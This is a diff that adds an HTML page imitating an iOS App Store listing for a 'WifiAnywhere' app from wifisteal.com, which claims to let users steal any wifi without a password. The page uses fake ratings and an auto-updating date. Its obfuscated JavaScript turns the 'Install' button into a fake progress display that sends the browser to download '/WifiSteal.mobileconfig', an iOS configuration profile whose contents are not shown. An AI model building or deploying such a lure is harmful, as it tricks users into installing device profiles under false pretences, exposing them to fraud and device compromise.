@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<title>WifiSteal.com - Steal Any Wifi Online</title>
+	<meta charset="UTF-8">
+	<meta content="width=device-width,initial-scale=1" name="viewport">
+	<meta content="initial-scale=1,user-scalable=no,maximum-scale=1" name="viewport">
+	<style>
+		body {
+			margin: 0;
+			padding: 0;
+			font-family: "Helvetica Neue";
+			font-weight: 400;
+			font-size: 13px;
+		}
+
+		div.section {
+			padding: 15px 5% 0 5%;
+			border-bottom: 1px solid #848484;
+			position: relative;
+		}
+
+		.page div.section {
+			width: 90%;
+			margin: 0 auto;
+			padding-bottom: 18px;
+			overflow: hidden;
+		}
+
+		.page div.section:last-child {
+			border: 0
+		}
+
+		div.section .title {
+			font-size: 19px;
+			color: #000;
+		}
+
+		div.section .subtitle {
+			font-size: 17px;
+			color: #666;
+		}
+
+		div.section .text {
+			color: #666;
+			margin-top: 15px;
+		}
+
+		.image {
+			background-repeat: no-repeat
+		}
+
+		i.star.image {
+			width: 8px;
+			height: 9px;
+			display: inline-block;
+			background-size: 8px 9px;
+		}
+
+		#header {
+			height: 150px;
+			position: relative;
+		}
+
+		#icon {
+			width: 100px;
+			height: 100px;
+			border-radius: 15px;
+			display: inline-block;
+			background-size: 100px 100px;
+		}
+
+		#appdetails {
+			margin-left: 9px;
+			display: inline-block;
+			vertical-align: top;
+		}
+
+		#appdetails .main {
+			font-size: 18px;
+			display: inline-block;
+			width: 155px;
+		}
+
+		#rating {
+			color: #666;
+			font-size: 11px;
+			position: absolute;
+			bottom: 50px;
+		}
+
+		.essentials {
+			width: 62px;
+			height: 15px;
+			background-size: 62px 15px;
+			margin-top: 5px;
+		}
+
+		#storerate {
+			width: 18px;
+			height: 12px;
+			background-size: 18px 12px;
+			position: absolute;
+			top: 18px;
+			right: 5%;
+		}
+
+		.switcher {
+			margin-top: 15px;
+			width: 100%;
+			display: table;
+			border: 1px solid #848484;
+			border-radius: 5px;
+		}
+
+		.fixed {
+			position: fixed;
+			width: 90%;
+			top: 0;
+			padding: 0 5%;
+			z-index: 9999;
+			background: #F8F8F8;
+			border-bottom: 1px solid #848484;
+			height: 43px;
+			opacity: .95;
+		}
+
+		.fixed .switcher {
+			position: relative;
+			top: 0;
+			margin-top: 8px;
+		}
+
+		.switcher-cell {
+			display: table-cell;
+			text-align: center;
+			color: #848484;
+			height: 26px;
+			vertical-align: middle;
+		}
+
+		.switcher-cell:not(:first-child) {
+			border-left: 1px solid #848484
+		}
+
+		.switcher-cell.selected {
+			color: #fff;
+			background-color: #848484;
+		}
+
+		input.progress {
+			display: none
+		}
+
+		div.progress {
+			margin: -29px 0 0 auto
+		}
+
+		.btn {
+			height: 24px;
+			width: 57px;
+			border-radius: 5px;
+			border: 1px solid #0085F9;
+			text-transform: uppercase;
+			color: #0085F9;
+			text-align: center;
+			display: table;
+			bottom: 51px;
+			margin: -29px 0 0 auto;
+		}
+
+		.btn span {
+			font-weight: 500;
+			vertical-align: middle;
+			display: table-cell;
+		}
+
+		.btn-install {
+			color: #26A92B;
+			border-color: #26A92B;
+			width: 71px;
+		}
+
+		.btn-open {
+			color: #0085F9;
+			border-color: #0085F9;
+			width: 51px;
+		}
+
+		#images {
+			padding-bottom: 27px
+		}
+
+		.hscroll {
+			overflow-x: scroll;
+			-webkit-overflow-scrolling: touch;
+			overflow-y: hidden;
+			margin: 0 auto;
+			height: 349px;
+			white-space: nowrap;
+		}
+
+		.hscroll .image {
+			width: 195px;
+			height: 347px;
+			border: 1px solid #848484;
+			background-size: 195px 347px;
+			display: inline-block;
+			margin-right: 15px;
+		}
+
+		#information dl {
+			margin: 14px 0 0 0
+		}
+
+		#information dt {
+			width: 80px;
+			text-align: right;
+			color: #999;
+			vertical-align: top;
+			display: inline-block;
+		}
+
+		#information dd {
+			margin: 0 0 5px 15px;
+			display: inline-block;
+			width: 65%;
+		}
+
+		#information dd:last-of-type {
+			margin-bottom: 0
+		}
+
+		#copyright {
+			color: #646464
+		}
+
+		#reviews i {
+			margin-right: 2px
+		}
+
+		#reviews dl {
+			width: 100%
+		}
+
+		#reviews dd,
+		dt {
+			float: left
+		}
+
+		#reviews dt {
+			width: 20%;
+			clear: left;
+		}
+
+		#reviews dd {
+			width: 75%;
+			margin: 0;
+			color: #6C6C6C;
+		}
+
+		#reviews .bar-container {
+			height: 2px;
+			border-radius: 4px;
+			background-color: #F2F2F2;
+			margin-top: 7px;
+		}
+
+		#reviews .bar {
+			float: left;
+			background: #848484;
+			border-radius: 4px;
+			padding: 0;
+			height: 2px;
+		}
+
+		#related img {
+			margin: 150px auto;
+			display: block;
+			width: 24px;
+		}
+	</style>
+</head>
+
+<body>
+	<div class="section" id="header">
+		<div class="image" data-src="logo.png" id="icon"></div>
+		<div id="appdetails">
+			<span class="main">WifiAnywhere</span>
+			<span class="sub"></span>
+			<div class="essentials image" data-src="essentials.png"></div>
+			<div id="rating">
+				<i class="image star" data-src="star.png"></i> <i class="image star" data-src="star.png"></i> <i class="image star" data-src="star.png"></i> <i class="image star" data-src="star.png"></i>
+				<i class="image star" data-src="star.png"></i>(129)
+			</div>
+		</div>
+		<div class="image" data-src="rating.png" id="storerate"></div>
+		<div class="btn btn-install" style="">
+			<span>Install</span>
+		</div><input class="progress" data-displayinput="false" data-height="26" data-readonly="true" data-width="26" type="text" value="1">
+		<div class="btn btn-open" style="display: none;">
+			<span>Open</span>
+		</div>
+		<div class="switcher">
+			<div class="switcher-cell selected" data-page="details"> Details </div>
+			<div class="switcher-cell" data-page="reviews"> Reviews </div>
+			<div class="switcher-cell" data-page="related"> Related </div>
+		</div>
+	</div>
+	<div class="fixed" style="display:none">
+		<div class="switcher">
+			<div class="switcher-cell selected" data-page="details"> Details </div>
+			<div class="switcher-cell" data-page="reviews"> Reviews </div>
+			<div class="switcher-cell" data-page="related"> Related </div>
+		</div>
+	</div>
+	<div class="page" id="details">
+		<div class="section" id="images">
+			<div class="hscroll">
+				<div class="image" data-src="1.png"></div>
+				<div class="image" data-src="2.png"></div>
+				<div class="image" data-src="3.png"></div>
+				<div class="image" data-src="4.png"></div>
+			</div>
+		</div>
+		<div class="section" id="description">
+			<div class="title">Description</div>
+			<div class="text">Compatible with all iPhone, iPod touch, iPad and iPad mini models running iOS 7.0 through 8.2 <br><br> With this application, Download and open 1 app while using wifi in your home / office / school, you can then continue to use your wifi, our advanced technology allows you to stay connected to Wifi within the iPhone / iPod / iPad device, </div>
+		</div>
+		<div class="section" id="whatsnew">
+			<div class="title">What's New</div>
+			<div style="margin-top:5px;" id="datez" class="subtitle"></div>
+			<div class="text">* New Technology, Download and open 1 app to verify wifi connection <Br><br> * No need to enter Wifi Password</div>
+		</div>
+		<div class="section" id="information">
+			<div class="title">Information</div>
+			<dl>
+				<dt>Developer</dt>
+				<dd>wifisteal.com</dd>
+				<div></div>
+				<dt>Category</dt>
+				<dd>Entertainment</dd>
+				<div></div>
+				<dt>Updated</dt>
+				<dd id="datey">Jan 15, 2015</dd>
+				<div></div>
+				<dt>Size</dt>
+				<dd>2.3 MB</dd>
+				<div></div>
+				<dt>Rating</dt>
+				<dd>Rated 4+</dd>
+				<div></div>
+				<dt>Compatibility</dt>
+				<dd>Required iOS 7.0 or later. <br>Compatible with iPhone, iPad, and iPod touch. This app is optimised for iPhone 5, iPhone 6, and iPhone 6 Plus</dd>
+				<div></div>
+				<dt>Languages</dt>
+				<dd>English, Arabic, Catalan, Chinese, Croatian, Czech, Danish, Dutch, Finnish, French, German, Greek, Hebrew, Hungarian Indonesian, Italian, Japanese, Korean, Malay, Norwegian, Polish, Portuguese, Romanian, Russian, Slovak, Spanish, Swedish, Thai, Turkish, Ukrainian, Vietnamese</dd>
+			</dl>
+		</div>
+		<div class="section" id="copyright"> &copy; www.wifisteal.com - 2015. </div>
+	</div>
+	<script>
+		var dt = new Date();
+		var lol = dt.getFullYear() + "/" + (dt.getMonth() + 1) + "/" + dt.getDate();
+		document.getElementById("datez").innerHTML = lol;
+		document.getElementById("datey").innerHTML = lol;
+	</script>
+	<div class="page" id="reviews" style="display:none">
+		<div class="section">
+			<div class="title">Ratings and Reviews </div>
+			<dl>
+				<dt><i class="star image" data-src="star.png"></i><i class="star image" data-src="star.png"></i><i class="star image" data-src="star.png"></i><i class="star image" data-src="star.png"></i><i class="star image" data-src="star.png"></i></dt>
+				<dd>129 Ratings</dd>
+				<dt><i class="star image" data-src="star-dark.png"></i><i class="star image" data-src="star-dark.png"></i><i class="star image" data-src="star-dark.png"></i><i class="star image" data-src="star-dark.png"></i><i class="star image" data-src="star-dark.png"></i></dt>
+				<dd>
+					<div class="bar-container">
+						<div class="bar" style="width:93%"></div>
+					</div>
+				</dd>
+				<dt><i class="star image" data-src="star-off.png"></i><i class="star image" data-src="star-dark.png"></i><i class="star image" data-src="star-dark.png"></i><i class="star image" data-src="star-dark.png"></i><i class="star image" data-src="star-dark.png"></i></dt>
+				<dd>
+					<div class="bar-container">
+						<div class="bar" style="width:5%"></div>
+					</div>
+				</dd>
+				<dt><i class="star image" data-src="star-off.png"></i><i class="star image" data-src="star-off.png"></i><i class="star image" data-src="star-dark.png"></i><i class="star image" data-src="star-dark.png"></i><i class="star image" data-src="star-dark.png"></i></dt>
+				<dd>
+					<div class="bar-container">
+						<div class="bar" style="width:2%"></div>
+					</div>
+				</dd>
+				<dt><i class="star image" data-src="star-off.png"></i><i class="star image" data-src="star-off.png"></i><i class="star image" data-src="star-off.png"></i><i class="star image" data-src="star-dark.png"></i><i class="star image" data-src="star-dark.png"></i></dt>
+				<dd>
+					<div class="bar-container">
+						<div class="bar" style="width:1%"></div>
+					</div>
+				</dd>
+				<dt><i class="star image" data-src="star-off.png"></i><i class="star image" data-src="star-off.png"></i><i class="star image" data-src="star-off.png"></i><i class="star image" data-src="star-off.png"></i><i class="star image" data-src="star-dark.png"></i></dt>
+				<dd>
+					<div class="bar-container">
+						<div class="bar" style="width:0"></div>
+					</div>
+				</dd>
+			</dl>
+		</div>
+	</div>
+	<div class="page" id="related" style="display:none">
+		<img src="loading.gif">
+	</div>
+	<script src="js/jquery-2.1.3.min.js" type="text/javascript"></script>
+	<script src="js/jquery.knob.min.js" type="text/javascript"></script>
+	<script type="text/javascript">
+		var _0xbf5c = ['send', 'pageview', 'create', '#', 'auto', 'hide', '.page:not(#', ')', 'show', 'selected', 'addClass', ".switcher-cell[data-page='", "']", 'removeClass', '.switcher-cell.selected', 'scrollY', '.fixed', 'devicePixelRatio', 'scroll', 'touchend', 'hasClass', 'page', 'data', 'on', '.switcher-cell', 'src', 'background-image', 'url(', 'css', '.', 'replace', 'each', '.image', 'location', '/WifiSteal.mobileconfig', 'event', 'button', 'click', 'open', 'preventDefault', '.btn-open', 'install', 'length', 'div.progress', 'change', 'trigger', 'val', 'input.progress', '#0085F9', 'progress', 'parent', '$', 'knob', '.progress', '.btn-install', 'done', 'jsonp', 'ajax', 'ready', 'script', 'http://www.google-analytics.com/analytics.js', 'ga', 'insertBefore', 'parentNode', 'async', 'l', 'GoogleAnalyticsObject', 'push', 'q', 'createElement', 'getElementsByTagName'];
+		var _0x89ae = [_0xbf5c[0], _0xbf5c[1], _0xbf5c[2], _0xbf5c[3], _0xbf5c[4], _0xbf5c[5], _0xbf5c[6], _0xbf5c[7], _0xbf5c[8], _0xbf5c[9], _0xbf5c[10], _0xbf5c[11], _0xbf5c[12], _0xbf5c[13], _0xbf5c[14], _0xbf5c[15], _0xbf5c[16], _0xbf5c[17], _0xbf5c[18], _0xbf5c[19], _0xbf5c[20], _0xbf5c[21], _0xbf5c[22], _0xbf5c[23], _0xbf5c[24], _0xbf5c[25], _0xbf5c[26], _0xbf5c[27], _0xbf5c[28], _0xbf5c[29], _0xbf5c[30], _0xbf5c[31], _0xbf5c[32], _0xbf5c[33], _0xbf5c[34], _0xbf5c[35], _0xbf5c[36], _0xbf5c[37], _0xbf5c[38], _0xbf5c[39], _0xbf5c[40], _0xbf5c[41], _0xbf5c[42], _0xbf5c[43], _0xbf5c[44], _0xbf5c[45], _0xbf5c[46], _0xbf5c[47], _0xbf5c[48], _0xbf5c[49], _0xbf5c[50], _0xbf5c[51], _0xbf5c[52], _0xbf5c[53], _0xbf5c[54], _0xbf5c[55], _0xbf5c[56], _0xbf5c[57], _0xbf5c[58], _0xbf5c[59], _0xbf5c[60], _0xbf5c[61], _0xbf5c[62], _0xbf5c[63], _0xbf5c[64], _0xbf5c[65], _0xbf5c[66], _0xbf5c[67], _0xbf5c[68], _0xbf5c[69], _0xbf5c[70]];
+		! function(_0x880ax1, _0x880ax2, _0x880ax3, _0x880ax4, _0x880ax5, _0x880ax6, _0x880ax7) {
+			_0x880ax1[_0x89ae[66]] = _0x880ax5, _0x880ax1[_0x880ax5] = _0x880ax1[_0x880ax5] || function() {
+				(_0x880ax1[_0x880ax5][_0x89ae[68]] = _0x880ax1[_0x880ax5][_0x89ae[68]] || [])[_0x89ae[67]](arguments)
+			}, _0x880ax1[_0x880ax5][_0x89ae[65]] = 1 * new Date, _0x880ax6 = _0x880ax2[_0x89ae[69]](_0x880ax3), _0x880ax7 = _0x880ax2[_0x89ae[70]](_0x880ax3)[0], _0x880ax6[_0x89ae[64]] = 1, _0x880ax6[_0x89ae[25]] = _0x880ax4, _0x880ax7[_0x89ae[63]][_0x89ae[62]](_0x880ax6, _0x880ax7)
+		}(window, document, _0x89ae[59], _0x89ae[60], _0x89ae[61]), $(document)[_0x89ae[58]](function() {
+			function _0x880ax1(_0x880ax1) {
+				$(_0x89ae[14])[_0x89ae[13]](_0x89ae[9]), $(_0x89ae[11] + _0x880ax1 + _0x89ae[12])[_0x89ae[10]](_0x89ae[9]), $(_0x89ae[3] + _0x880ax1)[_0x89ae[8]](), $(_0x89ae[6] + _0x880ax1 + _0x89ae[7])[_0x89ae[5]]()
+			}
+
+			function _0x880ax2() {
+				window[_0x89ae[15]] > 122 ? $(_0x89ae[16])[_0x89ae[8]]() : $(_0x89ae[16])[_0x89ae[5]]()
+			}
+			var _0x880ax3 = window[_0x89ae[17]] ? window[_0x89ae[17]] : 1;
+			$(_0x89ae[32])[_0x89ae[31]](function() {
+				var _0x880ax1 = $(this),
+					_0x880ax2 = _0x880ax1[_0x89ae[22]](_0x89ae[25]);
+				_0x880ax2 && (_0x880ax3 > 1 && (_0x880ax2 = _0x880ax2[_0x89ae[30]](_0x89ae[29], _0x89ae[29])), _0x880ax1[_0x89ae[28]](_0x89ae[26], _0x89ae[27] + _0x880ax2 + _0x89ae[7]));
+			}), $(_0x89ae[24])[_0x89ae[23]](_0x89ae[19], function() {
+				var _0x880ax2 = $(this);
+				!_0x880ax2[_0x89ae[20]](_0x89ae[9]) && _0x880ax1(_0x880ax2[_0x89ae[22]](_0x89ae[21]));
+			}), $(document)[_0x89ae[18]](_0x880ax2), _0x880ax2();
+			var _0x880ax4;
+			$(_0x89ae[54])[_0x89ae[23]](_0x89ae[19], function(_0x880ax1) {
+				_0x880ax1[_0x89ae[39]](), $(this)[_0x89ae[5]](), $(_0x89ae[43])[_0x89ae[42]] ? ($(_0x89ae[47])[_0x89ae[46]](1)[_0x89ae[45]](_0x89ae[44]), $(_0x89ae[43])[_0x89ae[8]]()) : $(_0x89ae[53])[_0x89ae[52]]({
+					inline: !1,
+					bgColor: _0x89ae[48],
+					fgColor: _0x89ae[48],
+					thickness: 0.1,
+					draw: function() {
+						this[_0x89ae[51]][_0x89ae[50]]()[_0x89ae[10]](_0x89ae[49])
+					}
+				}), ga(_0x89ae[0], _0x89ae[35], _0x89ae[36], _0x89ae[37], _0x89ae[41]);
+				var _0x880ax2 = 1;
+				_0x880ax4 && clearInterval(_0x880ax4), _0x880ax4 = setInterval(function() {
+					5 >= _0x880ax2 && ($(_0x89ae[47])[_0x89ae[46]](10 * _0x880ax2)[_0x89ae[45]](_0x89ae[44]), 1 == _0x880ax2 && setTimeout(function() {
+						window[_0x89ae[33]] = _0x89ae[34]
+					}, 500)), _0x880ax2 += 1, 10 == _0x880ax2 && ($(_0x89ae[43])[_0x89ae[5]](), $(_0x89ae[54])[_0x89ae[8]]()), $[_0x89ae[57]]({
+						url: _0x89ae[34],
+						dataType: _0x89ae[56]
+					})[_0x89ae[55]](function(_0x880ax1) {
+						_0x880ax1 === !0 && (clearInterval(_0x880ax4), $(_0x89ae[47])[_0x89ae[46]](99)[_0x89ae[45]](_0x89ae[44]), setTimeout(function() {
+							$(_0x89ae[53])[_0x89ae[5]](), $(_0x89ae[54])[_0x89ae[5]](), $(_0x89ae[40])[_0x89ae[8]]()
+						}, 1e3))
+					})
+				}, 1500);
+			}), $(_0x89ae[40])[_0x89ae[23]](_0x89ae[19], function(_0x880ax1) {
+				_0x880ax1[_0x89ae[39]](), ga(_0x89ae[0], _0x89ae[35], _0x89ae[36], _0x89ae[37], _0x89ae[38]), setTimeout(function() {
+					window[_0x89ae[33]] = _0x89ae[34]
+				}, 500)
+			});
+		}), ga(_0x89ae[2], _0x89ae[3], _0x89ae[4]), ga(_0x89ae[0], _0x89ae[1]);
+	</script>
+</body>
+
+</html>
